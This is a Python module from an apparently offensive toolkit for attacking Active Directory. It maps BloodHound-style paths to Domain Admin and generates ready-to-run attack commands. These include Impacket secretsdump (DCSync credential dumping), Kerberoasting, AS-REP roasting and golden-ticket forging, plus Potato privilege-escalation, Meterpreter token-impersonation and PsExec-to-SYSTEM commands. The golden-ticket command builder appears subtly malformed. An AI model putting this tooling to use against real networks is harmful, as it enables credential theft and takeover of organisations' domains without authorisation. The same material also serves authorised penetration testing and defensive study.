"""
DRAKBEN Advanced AD Extensions - BloodHound Integration & Token Impersonation
Author: @drak_ben
Description: Advanced Active Directory attack features.

This module provides:
- BloodHound-style graph analysis integration
- Impacket native integration support
- Token impersonation techniques
- DCSync attack preparation
- Golden/Silver ticket generation helpers
"""

import json
import logging
import os
import subprocess
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================


class BloodHoundRelationship(Enum):
    """BloodHound-style relationship types"""

    MEMBER_OF = "MemberOf"
    HAS_SESSION = "HasSession"
    ADMIN_TO = "AdminTo"
    CAN_RDP = "CanRDP"
    CAN_PSRemote = "CanPSRemote"
    EXECUTE_DCOM = "ExecuteDCOM"
    ALLOWED_TO_DELEGATE = "AllowedToDelegate"
    GENERIC_ALL = "GenericAll"
    GENERIC_WRITE = "GenericWrite"
    OWNS = "Owns"
    WRITE_DACL = "WriteDacl"
    WRITE_OWNER = "WriteOwner"
    HAS_SPN = "HasSPN"
    DCSYNC = "DCSync"
    GET_CHANGES = "GetChanges"
    GET_CHANGES_ALL = "GetChangesAll"


class ImpacketTool(Enum):
    """Impacket tools for AD attacks"""

    PSEXEC = "psexec.py"
    WMIEXEC = "wmiexec.py"
    SMBEXEC = "smbexec.py"
    ATEXEC = "atexec.py"
    DCOMEXEC = "dcomexec.py"
    SECRETSDUMP = "secretsdump.py"
    GETTGT = "getTGT.py"
    GETST = "getST.py"
    GETNPUSERS = "GetNPUsers.py"
    GETUSERSPNS = "GetUserSPNs.py"
    TICKETER = "ticketer.py"
    LOOKUPSID = "lookupsid.py"
    RPCDUMP = "rpcdump.py"


class TokenPrivilege(Enum):
    """Windows token privileges"""

    DEBUG = "SeDebugPrivilege"
    IMPERSONATE = "SeImpersonatePrivilege"
    ASSIGN_PRIMARY = "SeAssignPrimaryTokenPrivilege"
    TCB = "SeTcbPrivilege"
    LOAD_DRIVER = "SeLoadDriverPrivilege"
    BACKUP = "SeBackupPrivilege"
    RESTORE = "SeRestorePrivilege"
    TAKE_OWNERSHIP = "SeTakeOwnershipPrivilege"


# =============================================================================
# DATA CLASSES
# =============================================================================


@dataclass
class BloodHoundNode:
    """BloodHound graph node (User, Computer, Group, etc.)"""

    object_id: str  # SID or unique ID
    name: str
    node_type: str  # User, Computer, Group, Domain, GPO, OU
    properties: dict[str, Any] = field(default_factory=dict)

    # Key properties for attack planning
    enabled: bool = True
    admin_count: bool = False
    high_value: bool = False
    owned: bool = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "ObjectId": self.object_id,
            "Name": self.name,
            "Type": self.node_type,
            "Properties": self.properties,
            "Enabled": self.enabled,
            "AdminCount": self.admin_count,
            "HighValue": self.high_value,
            "Owned": self.owned,
        }


@dataclass
class BloodHoundEdge:
    """BloodHound graph edge (relationship)"""

    source: str  # Source object ID
    target: str  # Target object ID
    relationship: BloodHoundRelationship
    properties: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "Source": self.source,
            "Target": self.target,
            "Relationship": self.relationship.value,
            "Properties": self.properties,
        }


@dataclass
class AttackChain:
    """Chain of attacks from source to target"""

    source: BloodHoundNode
    target: BloodHoundNode
    edges: list[BloodHoundEdge]
    cost: float  # Lower is better
    techniques: list[str]

    def __len__(self) -> int:
        return len(self.edges)


@dataclass
class TokenInfo:
    """Windows token information"""

    username: str
    domain: str
    sid: str
    privileges: list[TokenPrivilege]
    groups: list[str]
    impersonation_level: str
    is_elevated: bool = False


# =============================================================================
# BLOODHOUND GRAPH ANALYZER
# =============================================================================


class BloodHoundAnalyzer:
    """
    BloodHound-style graph analysis for AD attack paths.

    Features:
    - Build attack graph from collected data
    - Find shortest path to high-value targets
    - Identify privilege escalation paths
    - Export to BloodHound compatible format
    """

    def __init__(self):
        self.nodes: dict[str, BloodHoundNode] = {}
        self.edges: list[BloodHoundEdge] = []
        self._adjacency: dict[str, list[BloodHoundEdge]] = {}

        logger.info("BloodHound analyzer initialized")

    def add_node(self, node: BloodHoundNode) -> None:
        """Add node to the graph"""
        self.nodes[node.object_id] = node
        if node.object_id not in self._adjacency:
            self._adjacency[node.object_id] = []

    def add_edge(self, edge: BloodHoundEdge) -> None:
        """Add edge (relationship) to the graph"""
        self.edges.append(edge)

        if edge.source not in self._adjacency:
            self._adjacency[edge.source] = []
        self._adjacency[edge.source].append(edge)

    def add_user(
        self,
        sid: str,
        username: str,
        domain: str,
        enabled: bool = True,
        admin_count: bool = False,
        high_value: bool = False,
    ) -> BloodHoundNode:
        """Add user node to graph"""
        node = BloodHoundNode(
            object_id=sid,
            name=f"{username}@{domain}".upper(),
            node_type="User",
            properties={"samaccountname": username, "domain": domain},
            enabled=enabled,
            admin_count=admin_count,
            high_value=high_value,
        )
        self.add_node(node)
        return node

    def add_computer(
        self,
        sid: str,
        hostname: str,
        domain: str,
        os: str = "Windows",
        high_value: bool = False,
    ) -> BloodHoundNode:
        """Add computer node to graph"""
        node = BloodHoundNode(
            object_id=sid,
            name=f"{hostname}.{domain}".upper(),
            node_type="Computer",
            properties={
                "samaccountname": f"{hostname}$",
                "domain": domain,
                "operatingsystem": os,
            },
            high_value=high_value,
        )
        self.add_node(node)
        return node

    def add_group(
        self, sid: str, name: str, domain: str, high_value: bool = False
    ) -> BloodHoundNode:
        """Add group node to graph"""
        # Check for high-value groups
        hv_groups = [
            "DOMAIN ADMINS",
            "ENTERPRISE ADMINS",
            "SCHEMA ADMINS",
            "ADMINISTRATORS",
            "BACKUP OPERATORS",
            "ACCOUNT OPERATORS",
        ]
        is_high_value = high_value or name.upper() in hv_groups

        node = BloodHoundNode(
            object_id=sid,
            name=f"{name}@{domain}".upper(),
            node_type="Group",
            properties={"name": name, "domain": domain},
            high_value=is_high_value,
        )
        self.add_node(node)
        return node

    def add_membership(self, member_sid: str, group_sid: str) -> None:
        """Add group membership relationship"""
        edge = BloodHoundEdge(
            source=member_sid,
            target=group_sid,
            relationship=BloodHoundRelationship.MEMBER_OF,
        )
        self.add_edge(edge)

    def add_admin_rights(self, user_sid: str, computer_sid: str) -> None:
        """Add admin rights relationship"""
        edge = BloodHoundEdge(
            source=user_sid,
            target=computer_sid,
            relationship=BloodHoundRelationship.ADMIN_TO,
        )
        self.add_edge(edge)

    def add_session(self, user_sid: str, computer_sid: str) -> None:
        """Add session relationship"""
        edge = BloodHoundEdge(
            source=computer_sid,
            target=user_sid,
            relationship=BloodHoundRelationship.HAS_SESSION,
        )
        self.add_edge(edge)

    def find_shortest_path(self, source_id: str, target_id: str) -> AttackChain | None:
        """
        Find shortest attack path using BFS.

        Args:
            source_id: Source node object ID
            target_id: Target node object ID

        Returns:
            AttackChain or None if no path exists
        """
        if source_id not in self.nodes or target_id not in self.nodes:
            return None

        # BFS
        from collections import deque

        queue = deque([(source_id, [])])
        visited = {source_id}

        while queue:
            current, path = queue.popleft()

            if current == target_id:
                # Build attack chain
                techniques = [self._edge_to_technique(e) for e in path]
                return AttackChain(
                    source=self.nodes[source_id],
                    target=self.nodes[target_id],
                    edges=path,
                    cost=len(path),
                    techniques=techniques,
                )

            for edge in self._adjacency.get(current, []):
                if edge.target not in visited:
                    visited.add(edge.target)
                    queue.append((edge.target, path + [edge]))

        return None

    def find_paths_to_high_value(
        self, source_id: str, max_depth: int = 5
    ) -> list[AttackChain]:
        """
        Find all paths to high-value targets.

        Args:
            source_id: Starting node
            max_depth: Maximum path length

        Returns:
            List of attack chains to high-value targets
        """
        paths = []

        # Find all high-value targets
        high_value_targets = [n.object_id for n in self.nodes.values() if n.high_value]

        for target_id in high_value_targets:
            path = self.find_shortest_path(source_id, target_id)
            if path and len(path) <= max_depth:
                paths.append(path)

        # Sort by cost (shortest first)
        paths.sort(key=lambda p: p.cost)

        return paths

    def get_kerberoastable(self) -> list[BloodHoundNode]:
        """Get users with SPNs (Kerberoastable)"""
        kerberoastable = []

        for node in self.nodes.values():
            if node.node_type == "User" and node.enabled:
                if node.properties.get("hasspn", False):
                    kerberoastable.append(node)

        return kerberoastable

    def get_asrep_roastable(self) -> list[BloodHoundNode]:
        """Get users without pre-auth (AS-REP Roastable)"""
        asrep = []

        for node in self.nodes.values():
            if node.node_type == "User" and node.enabled:
                if node.properties.get("dontreqpreauth", False):
                    asrep.append(node)

        return asrep

    def get_owned_nodes(self) -> list[BloodHoundNode]:
        """Get all owned nodes"""
        return [n for n in self.nodes.values() if n.owned]

    def mark_owned(self, node_id: str) -> bool:
        """Mark a node as owned (compromised)"""
        if node_id in self.nodes:
            self.nodes[node_id].owned = True
            return True
        return False

    def export_json(self, filepath: str) -> None:
        """Export graph to BloodHound-compatible JSON"""
        data = {
            "meta": {
                "type": "computers,users,groups",
                "count": len(self.nodes),
                "version": 5,
            },
            "data": [n.to_dict() for n in self.nodes.values()],
        }

        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)

        logger.info(f"Exported graph to {filepath}")

    def _edge_to_technique(self, edge: BloodHoundEdge) -> str:
        """Convert edge relationship to attack technique description"""
        technique_map = {
            BloodHoundRelationship.MEMBER_OF: "Group Membership",
            BloodHoundRelationship.ADMIN_TO: "Local Admin Access",
            BloodHoundRelationship.HAS_SESSION: "Session Hijacking",
            BloodHoundRelationship.CAN_RDP: "RDP Access",
            BloodHoundRelationship.GENERIC_ALL: "Full Control",
            BloodHoundRelationship.GENERIC_WRITE: "Write Access",
            BloodHoundRelationship.DCSYNC: "DCSync Attack",
            BloodHoundRelationship.ALLOWED_TO_DELEGATE: "Kerberos Delegation",
        }
        return technique_map.get(edge.relationship, edge.relationship.value)

    def get_statistics(self) -> dict[str, Any]:
        """Get graph statistics"""
        node_types = {}
        for node in self.nodes.values():
            node_types[node.node_type] = node_types.get(node.node_type, 0) + 1

        relationship_types = {}
        for edge in self.edges:
            rel = edge.relationship.value
            relationship_types[rel] = relationship_types.get(rel, 0) + 1

        return {
            "total_nodes": len(self.nodes),
            "total_edges": len(self.edges),
            "node_types": node_types,
            "relationship_types": relationship_types,
            "high_value_targets": sum(1 for n in self.nodes.values() if n.high_value),
            "owned_nodes": sum(1 for n in self.nodes.values() if n.owned),
        }


# =============================================================================
# IMPACKET INTEGRATION
# =============================================================================


class ImpacketWrapper:
    """
    Wrapper for Impacket tools.

    Provides:
    - Command generation for all Impacket tools
    - Output parsing
    - Credential handling
    """

    def __init__(self, impacket_path: str = None):
        """
        Initialize Impacket wrapper.

        Args:
            impacket_path: Path to impacket scripts (auto-detect if None)
        """
        self.impacket_path = impacket_path or self._find_impacket()
        self.available_tools: list[ImpacketTool] = []

        if self.impacket_path:
            self._check_available_tools()

        logger.info(
            f"Impacket wrapper initialized: {len(self.available_tools)} tools available"
        )

    def _find_impacket(self) -> str | None:
        """Try to find impacket installation"""
        # Check common locations
        paths_to_check = [
            "/usr/share/doc/python3-impacket/examples",
            "/usr/local/bin",
            "/opt/impacket/examples",
            os.path.expanduser("~/.local/bin"),
        ]

        for path in paths_to_check:
            if os.path.exists(os.path.join(path, ImpacketTool.PSEXEC.value)):
                return path

        # Check if in PATH
        try:
            result = subprocess.run(
                ["which", ImpacketTool.PSEXEC.value], capture_output=True, text=True
            )
            if result.returncode == 0:
                return os.path.dirname(result.stdout.strip())
        except Exception as e:
            logger.debug(f"Failed to find impacket in PATH: {e}")

        return None

    def _check_available_tools(self) -> None:
        """Check which Impacket tools are available"""
        for tool in ImpacketTool:
            tool_path = os.path.join(self.impacket_path, tool.value)
            if os.path.exists(tool_path):
                self.available_tools.append(tool)

    def is_available(self, tool: ImpacketTool) -> bool:
        """Check if a specific tool is available"""
        return tool in self.available_tools

    def generate_command(
        self,
        tool: ImpacketTool,
        target: str,
        domain: str = "",
        username: str = "",
        password: str = None,
        ntlm_hash: str = None,
        kerberos: bool = False,
        additional_args: list[str] = None,
    ) -> str:
        """
        Generate Impacket command.

        Args:
            tool: Impacket tool to use
            target: Target host
            domain: Domain name
            username: Username
            password: Password (mutually exclusive with ntlm_hash)
            ntlm_hash: NTLM hash (LM:NT or just NT)
            kerberos: Use Kerberos authentication
            additional_args: Additional arguments

        Returns:
            Command string
        """
        cmd_parts = []

        # Tool path
        if self.impacket_path:
            tool_path = os.path.join(self.impacket_path, tool.value)
        else:
            tool_path = tool.value

        cmd_parts.append(f"python3 {tool_path}")

        # Build credential string: domain/user:pass@target or domain/user@target
        user_spec = f"{domain}/{username}" if domain else username

        if password:
            cmd_parts.append(f"'{user_spec}:{password}@{target}'")
        elif ntlm_hash:
            cmd_parts.append(f"'{user_spec}@{target}'")
            cmd_parts.append(f"-hashes ':{ntlm_hash}'")
        elif kerberos:
            cmd_parts.append(f"'{user_spec}@{target}'")
            cmd_parts.append("-k -no-pass")
        else:
            cmd_parts.append(f"'{user_spec}@{target}'")

        # Additional arguments
        if additional_args:
            cmd_parts.extend(additional_args)

        return " ".join(cmd_parts)

    def generate_secretsdump(
        self,
        target: str,
        domain: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None,
        just_dc: bool = False,
        just_dc_user: str = None,
    ) -> str:
        """Generate secretsdump.py command"""
        args = []

        if just_dc:
            args.append("-just-dc")
        if just_dc_user:
            args.append(f"-just-dc-user {just_dc_user}")

        return self.generate_command(
            ImpacketTool.SECRETSDUMP,
            target,
            domain,
            username,
            password,
            ntlm_hash,
            additional_args=args,
        )

    def generate_getuserspns(
        self,
        target: str,
        domain: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None,
        output_file: str = None,
    ) -> str:
        """Generate GetUserSPNs.py command (Kerberoasting)"""
        args = ["-request"]

        if output_file:
            args.extend(["-outputfile", output_file])

        return self.generate_command(
            ImpacketTool.GETUSERSPNS,
            target,
            domain,
            username,
            password,
            ntlm_hash,
            additional_args=args,
        )

    def generate_getnpusers(
        self,
        target: str,
        domain: str,
        username: str = None,
        usersfile: str = None,
        output_file: str = None,
    ) -> str:
        """Generate GetNPUsers.py command (AS-REP Roasting)"""
        args = ["-no-pass"]

        if usersfile:
            args.extend(["-usersfile", usersfile])
        if output_file:
            args.extend(["-outputfile", output_file])

        # For AS-REP roasting, we target DC directly
        target_identity = f"{domain}/{username}" if username else f"{domain}/"
        return f"python3 {ImpacketTool.GETNPUSERS.value} {target_identity} -dc-ip {target} {' '.join(args)}"

    def generate_ticketer(
        self,
        domain: str,
        domain_sid: str,
        nthash: str,
        user: str = "Administrator",
        groups: str = "512,513,518,519,520",
        golden: bool = True,
    ) -> str:
        """Generate ticketer.py for Golden/Silver ticket"""
        args = [
            f"-domain {domain}",
            f"-domain-sid {domain_sid}",
            f"-nthash {nthash}",
            f"-groups {groups}",
        ]

        if golden:
            args.append("-user 'krbtgt'")

        args.append(user)

        return f"python3 {ImpacketTool.TICKETER.value} {' '.join(args)}"


# =============================================================================
# TOKEN IMPERSONATION
# =============================================================================


class TokenImpersonator:
    """
    Windows Token Impersonation techniques.

    Techniques:
    - Token duplication
    - Process token stealing
    - Named pipe impersonation
    - Potato attacks helper
    """

    def __init__(self):
        self.captured_tokens: list[TokenInfo] = []
        self.current_token: TokenInfo | None = None
        logger.info("Token impersonator initialized")

    def get_current_token_info(self) -> TokenInfo | None:
        """
        Get information about current process token (Windows only).

        Returns:
            TokenInfo or None if not on Windows
        """
        if os.name != "nt":
            logger.warning("Token impersonation only works on Windows")
            return None

        try:
            # Get current user info
            import ctypes

            # Get username
            username = os.environ.get("USERNAME", "unknown")
            domain = os.environ.get("USERDOMAIN", "")

            # Check elevated
            is_elevated = ctypes.windll.shell32.IsUserAnAdmin() != 0

            return TokenInfo(
                username=username,
                domain=domain,
                sid="",  # Would need more API calls
                privileges=[],
                groups=[],
                impersonation_level="Impersonate" if is_elevated else "Identify",
                is_elevated=is_elevated,
            )

        except Exception as e:
            logger.error(f"Failed to get token info: {e}")
            return None

    def generate_potato_command(
        self, technique: str = "sweet", command: str = "cmd.exe", clsid: str = None
    ) -> str:
        """
        Generate Potato attack command.

        Potato attacks abuse Windows service impersonation to escalate
        from service accounts to SYSTEM.

        Args:
            technique: sweet, juicy, or rouge
            command: Command to run as SYSTEM
            clsid: CLSID for the attack

        Returns:
            Command string
        """
        if technique == "sweet":
            # SweetPotato
            return f"SweetPotato.exe -e {command} -p cmd"
        elif technique == "juicy":
            # JuicyPotato
            clsid = clsid or "{4991d34b-80a1-4291-83b6-3328366b9097}"
            return f"JuicyPotato.exe -l 1337 -p {command} -t * -c {clsid}"
        elif technique == "rogue":
            # RoguePotato
            return f'RoguePotato.exe -r 10.0.0.1 -e "{command}"'
        else:
            return f"# Unknown potato technique: {technique}"

    def generate_incognito_command(
        self, action: str = "list_tokens", token_user: str = None, command: str = None
    ) -> str:
        """
        Generate Incognito/Metasploit token commands.

        Args:
            action: list_tokens, impersonate, or execute
            token_user: User token to impersonate
            command: Command to execute

        Returns:
            Command string (Meterpreter format)
        """
        if action == "list_tokens":
            return "list_tokens -u"
        elif action == "impersonate" and token_user:
            return f"impersonate_token '{token_user}'"
        elif action == "execute" and token_user and command:
            return f"execute -t -i -H -c '{command}'"
        else:
            return "# Invalid incognito command"

    def generate_runas_command(
        self, username: str, domain: str, command: str, netonly: bool = False
    ) -> str:
        """
        Generate runas command for credential use.

        Args:
            username: Username
            domain: Domain
            command: Command to execute
            netonly: Use /netonly (credentials for network only)

        Returns:
            Command string
        """
        flags = "/netonly" if netonly else ""
        return f'runas {flags} /user:{domain}\\{username} "{command}"'

    def generate_psexec_system_command(self, command: str = "cmd.exe") -> str:
        """Generate PsExec command to get SYSTEM"""
        return f"psexec.exe -i -s {command}"

    def get_impersonation_techniques(self) -> list[dict[str, str]]:
        """Get list of available impersonation techniques"""
        return [
            {
                "name": "Potato Attacks",
                "description": "Escalate from service account to SYSTEM",
                "requires": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
                "variants": [
                    "SweetPotato",
                    "JuicyPotato",
                    "RoguePotato",
                    "PrintSpoofer",
                ],
            },
            {
                "name": "Token Duplication",
                "description": "Duplicate existing token with higher privileges",
                "requires": "SeDebugPrivilege",
                "tool": "Incognito, TokenManipulation",
            },
            {
                "name": "Named Pipe Impersonation",
                "description": "Create named pipe and impersonate connecting client",
                "requires": "Service context",
                "tool": "Custom exploit",
            },
            {
                "name": "Make Token",
                "description": "Create token with known credentials",
                "requires": "Valid credentials",
                "tool": "Mimikatz, CobaltStrike",
            },
            {
                "name": "Process Injection",
                "description": "Inject into process running as different user",
                "requires": "SeDebugPrivilege",
                "tool": "Various injectors",
            },
        ]


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================

_bloodhound_analyzer: BloodHoundAnalyzer | None = None
_impacket_wrapper: ImpacketWrapper | None = None
_token_impersonator: TokenImpersonator | None = None


def get_bloodhound_analyzer() -> BloodHoundAnalyzer:
    """Get singleton BloodHound analyzer"""
    global _bloodhound_analyzer
    if _bloodhound_analyzer is None:
        _bloodhound_analyzer = BloodHoundAnalyzer()
    return _bloodhound_analyzer


def get_impacket_wrapper() -> ImpacketWrapper:
    """Get singleton Impacket wrapper"""
    global _impacket_wrapper
    if _impacket_wrapper is None:
        _impacket_wrapper = ImpacketWrapper()
    return _impacket_wrapper


def get_token_impersonator() -> TokenImpersonator:
    """Get singleton Token impersonator"""
    global _token_impersonator
    if _token_impersonator is None:
        _token_impersonator = TokenImpersonator()
    return _token_impersonator


def find_path_to_domain_admin(
    source_sid: str, analyzer: BloodHoundAnalyzer = None
) -> AttackChain | None:
    """
    Convenience function to find path to Domain Admin.

    Args:
        source_sid: Starting node SID
        analyzer: BloodHound analyzer (uses singleton if None)

    Returns:
        AttackChain or None
    """
    if analyzer is None:
        analyzer = get_bloodhound_analyzer()

    # Find Domain Admins group
    for node in analyzer.nodes.values():
        if node.node_type == "Group" and "DOMAIN ADMINS" in node.name.upper():
            return analyzer.find_shortest_path(source_sid, node.object_id)

    return None
